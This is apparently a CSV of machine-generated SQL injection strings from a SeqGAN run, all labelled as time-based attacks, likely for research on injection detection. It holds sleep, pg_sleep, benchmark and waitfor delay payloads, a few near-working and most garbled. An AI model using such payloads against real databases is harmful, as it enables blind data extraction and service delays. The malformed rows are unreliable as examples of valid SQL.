label,payload,family,payload_type,method,run_id,sample_index
attack,"select sleep  (  5   )     )   --zo  )   (     5000000,  (  (  =  benchmark  (  5   )    )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,825
attack,"select benchmark  (  benchmark  (  5000000,md5  (  (  5   )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,826
attack, 6793  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,827
attack,"1' rlie    ( rlt    (  select 6969 from and pg_sleep  (  select 4240 from from pg_sleep  (  select 8466  (  =  (  ' and * from   (  select  (  sleep  (  5   )     )   (     )   'rnzp'    5   # 8594  =    (  ""%""  =  select from    6866  =    (    (  select 8594 from from   (  5   )    )     )   (  select,t  (  5   )    )     )     )   and    (    (    (  select * from   (    =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,828
attack,1'  )   waitfor delay '0:0:5   (hikeoe pg_sleep  select 6969 from from   (     5   )    (select  (  62725  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,829
attack,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  'w",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,830
attack,"1 where sleep  (  1210   from pg_sleep  (  5   )    )     )   -- e from from   (  =       (  select 8514  =  1210,sleep  (  5,md5  (  select  (  5   )    )     esduqqu 6969do  )  )  2841 dk=  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,831
attack,"1'+  (  select 'ddok' where 1241  =  1241 waitfor delay '0m 9008  =  5   )     * e' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ' 6793    =    and   (  select 4240 '0:0:5' eme  (  5   )    <> elt  (  1210,sleep  (  5000000,md  select,sleep  (  select  (  5   )      'yfvu' and    (    (    (  0x6d457153   )    )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,832
attack, (  select(  0x544d5a4c  --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,833
attack," select 8514  =  =  (  =  benchmark  (  (  5  )   (  select 3824  =  # from pg_sleep  (  5000000,mdm  (  select  (  sleep  (  (  5   )    )     )  s elt  (  5   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,834
attack,"1"" where 7196  (  =  2841 or 6793  select)   and    (     select (  5   )    )     )    )    r   gqumqhsdd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,835
attack,1 or 8514  =  benchmark  (  5   )     )    (  select 4240 '0:0:5'mq  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,836
attack,1  )   (  select 6969 elt  (  select  (  5sgp y,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,837
attack,select benchmark  (  5  )  #   t  =    and   'wyvx'  1915  =    (  (    (  select 4240 from from   (  5   )    )   # and 6793  =    # 8594 do  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,838
attack,vi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,839
attack,1   )    )   # or 6793  =    (  (  select * from  sleep  (  5   )    )    (  5   )    )   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,840
attack,1  )   where 7021 8485 from   (  select  (  =  (  5   )     )  sdo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,841
attack,  )  sddkiqsddkmo  )    )     )gvz,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,842
attack,"1"" or 4240  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,843
attack,"select "" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""qt 8466  =    (  5   )    )     esd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,844
attack,"1%where 6793  =  7196 4240 from pg_sleep  (  (  ( 5   and    (     )   -- 2388  =  7196  (  5   )    sefrom   (  ""wucy"" elt  (  =  1210 from pg_sleep  (  0x76555642 r  (  =    (  ""%""  =  benchmarkr as kdo  )     6793 k  =    (    (   k  select 4240 from pg_sleep  (  sleep  (  5  )  =  benchmark  =  3672 #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,845
attack,select benchmark  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,846
attack,"1%"" or and   (  select 6793 from pg_sleep  (  sleep  (  5   and        (    (  select 4240 from,pg_sleep  (  5   )    and 8514  0x694a4745   (  select 6793 from pg_sleep  (  0x694a4745   )     )  )    )   'fegp'    (  select "" 6793 from pg_sleep  (  (  5  )     )  swq  )    ruqwuq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,847
attack,1'   )    )     )   waitfor delay '0:0waitforu )   )    as elt  (  select sleep  (  )   (  (  0x544d5a4c   )    )     )  se from pg_sleep  (  0x4c4d6142   )    )     )   )    and    (    (    )    )   -- emd5  (  6272  =  # from pg_sleep  (  0x544d5a4c   )     )   # yaqu,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,848
attack,select sleep  (  )  (  (  select  (  5   )   )     )  vwyq  )   (  select 6969 7196  =    (     )  and 8594  =  1915,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,849
attack,"select sleep  (  5000000,md5  (  =  (  5  sd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,850
attack,"1'  )   where 'sa' 1132  =  (  8667 (  sleep  (  5   )     )  're or 8466  =  5   )     )  s 6793 "" e from   (  select  (  5   )     )  sddo  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,851
attack,"1 or 8514  =  =  7021 6969 from pg_sleep  (  5   and    (     )  r k  5000000,md5(  select 6793 from pg_sleep  (  5   )     )   (     (  5   )     )    r  sddomd  )    )     )  )     )     )  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,852
attack,"select sleep  (  select from pg_sleep  (  )  select elt  (  5000000,md5  (  5   )     (  5000000,md5  (  =  (  5  )    )  vvyqeselect 8514  (  =  8485 from pg_sleep  (  select from 4240 from pg_sleep  (  5000000,md5  (  0x694a4745   )     )   (  select ,sleep  (  5000000,)   8466  =  benchmark  (  5   )    and    (  0x76555642   (  select 4240 from    (  select 8594 from from 6793  =  8252  =",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,853
attack,  sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,854
attack,"select benchmark  (  sleep  (  5   )     )   rur) and 8594 from x  =    (  0x544d5a4c   )     )   and    (  'fegp'  )     )     (  '%'  =    (  )   '0:0:5'and   (    (  'wyvx'  =    (  ""uvzc"" fqq do=  gcrru ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,855
attack," 8466 from pg_sleep  (  sleep  (  sleep  (  5   and    (    (     (  vwyq  )    )    and   select   (  select 6793  =  )   (  select 4240 pg_sleep  (  sleep  (  sleep  (  5000000,sleep  (  5   )    as   kvq  )    )     )   (  select 6793 fromrlt from where  =  4683 from   (  sleep  'hrta' benchmark  =   from pg_sleep  (  5   )    )    )   -- k""yf""%""  =    (    (  select 8594 from from from",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,856
attack,pnt  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,857
attack,select and 8514  =  benchmark  benchmark  5   )    and   (  select from waitfor sleep  =  (  5   and   7196    (  select sleep  (  0x544d5a4c (  select  (  5   )    )     (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,858
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,859
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojselect or 4240  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,860
attack,"1 (  select * from   (  select  (  sleep  (  0x544d5a4c   (  5   )    )     )  sdq  )   and    (     (  select * from   (  (    (  5000000,md5  (  select 6793 from 4240  =  9649 and  (  1915  =    (  5   )    (     (  5  )  )  )   -- x  =  vyfiq   (  select * from  =  7305  3114  5  (  select (  v 2239  =  8252 6793 from from from from from   (  sleep  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,861
attack,"select sleep  (  (  sleep  (  5000000,md5  (  (  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,862
attack,1'  )   waitfor delay '0:j 7279  (  5   )    (  5   )    )   -- dkvkkf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,863
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'p""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,864
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  ' or        (  'hrta' o  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,865
attack,"select sleep      (  select 4240 from pg_sleep  (  5   )    )    )   and 8466  =  benchmark  (  8667 * fromsleep  9649 4240 from pg_sleep  (  5  )   <> 2388  =  6272  =  6272,sleep  (  0x544d5a4c   (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,866
attack,1  )   or 8514  =  2841 k  (  =  benchmark  (  5   and    (  1210  =     -- and(  select sleep  =  (  sleep  (  sleep  (  5   )    and    (    (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,867
attack,"select pg_sleep  5   )    <> e   (  ""wucy"" and    (    (    (  )    as and    (    (     (  select 6793 from from from pg_sleep  (  5   )    and    (    (  6272  =    (   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,868
attack,' like 'z    5   )    awe where 9008 from   (  select   (  select 4240 from pg_sleep  (  5   )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,869
attack,1   )    )   and el,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,870
attack," and from from   (    (  select  (  5   q * from   5874  =    and 6969    (  select * 6969 from   (  select  sleep  (  (  (  5000000,md5  (  select   (  select or 8514  =  6272,5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,871
attack,select sleep  (  5  )   'rnzp'  =  'fv1r,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,872
attack,"1"" and e 6969 8514  =  benchmark  (  5   and    (    (    (    (  select,sleep  =  (  5   )    )     (  0x694a4745   )    )    as do   (  select 6793 -- from '0:0:5')    r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,873
attack,"1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%   "" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""'  =  'ojpe",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,874
attack,"1')   where not  (  5000000,md5  (  0x694a4745   )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,875
attack,1'   )     )   and    (    (     (     (  3114  =  (  0x694a4745   )    )     (  wq where 8507  =  6175 #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,876
attack,"select   )    )   as ke from   (  select 6793m  =  6272,sleep  (  0x544d5a4c   )    )     )   8594 do  )   (  select 4240 8252  (  =  =  benchmark  =  (  =  ""  =  (  =  (  5000000,md5  (  =  (  9008 from or e   (  select 6793 from5   (    (  select 4240 from(  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,877
attack,1   )    )   whereu 6175  select 8594 '0:0:5' -- not  select 4240 from pg_sleep  (  benchmark  (  sleep  (  (  2841 or 4240  (  =  1679 or 4240 from from from   (  select  (  =  (  select  (  5   )     )  sdd from kvkvkvtf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,878
attack,1'  )   waitfor delay '0:0:x5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,879
attack,"select from from from from from   (  sleep  sleep  (  (  5   )    )     )  (  ""%""",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,880
attack," where from pg_sleep  (  5   )     (  select 4240 from pg_sleep  (  5   )    (  select sleep  (  5000000  (  0x544d5a4c   and    (     (  ""%""  =    (  (  select 6969 from and   (  select from pg_sleep  (  5   )    )     )   # like ""as and    (  'wyvx'<> xd5  (  select 6793 from pg_sleep  (  select 4240 from and   )    )    )    rs diashwkqwyq where 8252  8252 or 4240  =    (  select 4240",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,881
attack,select 5  )    or)   and    (    (     5  )   and     (    (    (  1679 or 3824  =  =   sgf  (     (  0x694a4745   )     )    and    (     )   )     (  select 8594 from pg_sleep  (  5   )    )    (  select 4240 from or 8466  =  7305 or 6793c  sleep  )e  )     )   and    (     (  select * from from   (  select  sleep  (  1679  (  sleep  (  5   )    (1  )  #puc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,882
attack,"1"" and 6969 dmpe6793   from select 5000000,md5  (  (  select 4240 from or  pg_sleep  (  5   )    )    )     --    (     )   as waitfor delay '0:0:5'--ut (  ""zlal""  =  n",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,883
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'pwhere 2239pe  (  0x4c4d6142   )    and    (     (  select 6969 from pg_sleep  (  5   )     )  sdd5)  )   (  select * 6793  =    (  select 8594 from from   (  select  (  5   )     )    and    (  5  (     (  select 6969 from from   (  select  (  sleep  5   )     )    r",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,884
attack,1'+  (  select 'dk)    )     )   where not  (  select  (  5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,885
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chv rlicoe  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,886
attack,1'  )   where delay from   (  select 4240 from (  (  sleep  (  5   )    )     )    )   (vw,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,887
attack,select pg_sleep5   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,888
attack,"1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%""   )    )    rlike sleep  (  5  )   and    (    (   ""bin'  =  'f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,889
attack,"select 8514 from pg_sleep  (  5   )     )   )     )  ""%"" qfv 'yfvu' 7279 8507 or and el not  (  5   and    (  select * from   (  select  (  5000000,md5  (  0x4c4d6142   e 6793  =    (     (  1915  =    (  v'%'  =    (  select 6793 from and 6793  select 4240 sleep  sdd5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,890
attack," waitfor    (  select 8594 from from   (  select * 7196  (  5000000,md5  (  5   )     )   -- 9008  =  1210  =  7021 # 8485 or sleep  1210r  =  (  =  benchmark  (  =  benchmark  (  5 rlike from      5874  =  7021 f",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,891
attack,"select sleep  (  5000000,md5  select 4240 from pg_sleep  (  5   )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,892
attack,"1"" and 8594  =  5874ru 'yfvu'u like  =    (     (    (  select * from   (  0x544d5a4c sleep(  sddo  )  1210",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,893
attack,"1   )    (  select 8594 from or from   (  select from from   (  0x76555642   8594  =  ""uvzc"" d  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,894
attack," sleep  select from b,sleep  '  (  (  5   )    )    )    (  select sleep  (  5   )    )     )  sdd5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,895
attack,"1"" or   (  ""uvzc"" 8594  =    (     (  select 6793 from 2841  =  6383 waitfor 2044  =  (  =  9649 or from   (  select sleep  (  5   )     )   and    (    (        (  ""uvzc"" k8594    (       # where waitfor 2044  =  (  =  benchmark  (  =  =  7279 and(  select (  0x544d5a4c   or 8514  =  benchmark   from pg_sleep  (  (  5   )    )     )   where 2044  =  and   (  select 6793  =md5  )  s f2239  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,896
attack,select 5   )     )   and    (    (    (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,897
attack,"  select not  (  (  select 6793 from pg_sleep  (  benchmark  (  5   )     )    and    (    (     (  select 4240 sleep  (  6272,sleep  (  5   )     )    )     )    )     )   # like 1679us d",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,898
attack,1 pg_sleep  (  5  )   and    (    (erand and    (     select sleep  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,899
attack,1'   )    as yd where 7305 (  =  6272  (  =  benchmark   from pg_sleep 3824  =  (  5   )    (  select from pg_sleep  (  5   )    )    )   # ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,900
attack,ike)   )     )  sddk  =    (  0x4c4d6142   )     )(  select 6969 from 'sa' elt  (  5  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,901
attack,"
 benchmark  (  5   )    )    (   (  5000000,md5  (  =  (  (  select  (  5   # where --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,902
attack,1)   or 8514  =  benchmark  (  5  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,903
attack,1'  )   waitfor delay '0:00x4c4d6142   (  select 4240 from from   (  sleep  (  5   )    )    and   (  select 8514  =  (benchmark  0x544d5a4c   pwh  (  0x544d5a4c   (  select 6793 from pg_sleep  6272  (  sleep  (  sleep  )   (  5   )    )     )rr  )sddm,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,904
attack,"1"" and e pg_sleep  (      (  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,905
attack,select from pg_sleep  2044 or sleep  select 8594 from pg_sleep  (  sleep  (  sleep  (  5   )    )     )  (    ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,906
attack,"1%"" and 6793  =    (  '%'  )  and 6793 and  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,907
attack,"select   5   )     )   and    (  select 4240 from from 4240  =  5000000,sleep  (  5000000,md5  (  0x694a4745   and  ""uvzc"" do   from or 8514  =  (  sleep  (  5   )    )     )sgp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,908
attack,"1 or   0x544d5a4c   (  ""zlal""  =  '  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,909
attack,"1 where '0:0:2' '0:0:5' --7305  )   and    )     )     )   (  select 4240 # or --  =     (  ""uvzc"" 8594 --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,910
attack," 2239 (  )sddo  =  1210,=  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,911
attack,select benchmark  (  5   )    r 6969  =    (    (  select 6793 from   (  select * from   (  =  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,912
attack,"1"" pg_sleep  select pg_sleep  (  5   )     )   as emd5  (  0x544d5a4c   )    (  select 8594 from pg_sleep where sleep  (  (  select  s rmq  )  )   # like # ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,913
attack,"1'  )   waitfor delay '0:0select0:5'   6866    aes e from   (  ""uvzc"" from 8466  6272  =  7196 (  5000000,md  =  (  5   )    and    (    (  select 6969 from 8466 from   (  select 6969 from from   (  0x76555642   (  select  (  select,sleep  (  5   )     )  s  1915 rmdo  =  benchmark  # rerur",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,914
attack,"1"" "" where e   )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,915
attack,select pg_sleep   (  select from from from   (  sleep  (  select  (  0x4c4d6142  )   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,916
attack,select sleep  (  5   )    )   -- kavt  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,917
attack,"1    )   and elt  (  5   )    )     )   <> e delay from from   select 6793  =  syq    )     )    )    and     select 6969    (  ""wucy"" 6793 dk  =    (  ""wucy"" 8594 1132  =    (   'wyvx'fq",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,918
attack," sleep  0x544d5a4c   )     )     )   #s  =    (    (  sddo  =    (  5874    (  1210  1210,sleep  (  5000000,md5  (z  7305 jo  =    (  select from pg_sleep  (  5000000,md  =  benchmark  (  5   )    (     (    (  select 4240 from pg_sleep  (  5   )     )    )srmq  )   or 8514  =  (  0x544d5a4c   (  select or 6793  =    )   #  )   and    (     (  select * from   (  0x4c4d6142   (  0x544d5a4c   (  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,919
attack,1     )   and   (  select 6793  (  7279 --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,920
attack,"1 or 8594 from   (  select 4240  (  =  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )     )    r)     )   as e9008 8667 pg_sleep  (  5   )    )    (  yd and 6793 6969 from 8594 *  (  =    (e  (  5  ) rmq  )  st  (  =    (  4683 8594 benchmark  =    (    (  0x4c4d6142   )    (  select * from   (  5000000,md5  (    (  select * from   (  5  srelt  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,921
attack,"1'  )   waitfor delay '0o,)   (  select pg_sleep  (  5   )    )     )   and     select 4240    (  select sleep  (  (  5000000,md5  (  0x544d5a4c   )    )     )   sd  ye and   (  select * from       (  6175  (    (     (  select 6793 from or from   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,922
attack,"select sleep  (  0x544d5a4c   )    )    aw do  =    (     (  0x544d5a4c  )urgnselect from or from   (  select  (    (  sleep  (  5   )    )    )     )    and    (    (    (    (  select 6969 from pg_sleep  (  5   )    and   (  select sleep  (  sleep  (  (  5   )   )    )     )   (    (  select * from   (  5   2239  select 6793 from 3824  =  7196 or 4240  (  =  6272,sleep  (  5   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,923
attack,select 5   )    as j  =    (   4683 k  3672 ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,924
attack,"1'||  (  select ';"" 5000000'||  (  select ''rnzp'd5  (  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,925
attack,"1 or   (  select 6793  (  5000000,md5  (  1210  2044 from from sleep  (  0x76555642   (    (d  )  select * 8594  =  select from pg_sleep  (  5   )     )   (  select 8594 '0:0:5' #yf",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,926
attack,1'    and    (  select 6793 from '0:0:5' waitfor '0:0:5'-- waitfor from   (  select  sleep  (  select from 6969 from   (  sleep  2239 #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,927
attack,"select 6969 from pg_sleep  (  5000000,mdo    1210,sleep  (    (  5   )    (  select from from from pg_sleep  (  5   )     )  srd",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,928
